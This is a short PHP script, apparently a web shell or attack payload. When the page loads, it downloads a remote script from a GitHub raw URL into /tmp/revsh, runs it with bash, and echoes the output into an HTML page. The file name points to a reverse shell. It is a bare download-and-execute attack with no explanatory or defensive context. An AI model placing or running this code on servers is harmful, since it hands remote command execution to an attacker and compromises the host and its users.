
<?php 
	$prova = shell_exec('wget -O /tmp/revsh https://raw.githubusercontent.com/Gabry-r/Shellscripts/master/tes; /bin/bash /tmp/revsh > /tmp/output; cat /tmp/output');
	print "<html>
	    <body>
		{$prova}
	    </body>
	  </html>
	";
?>
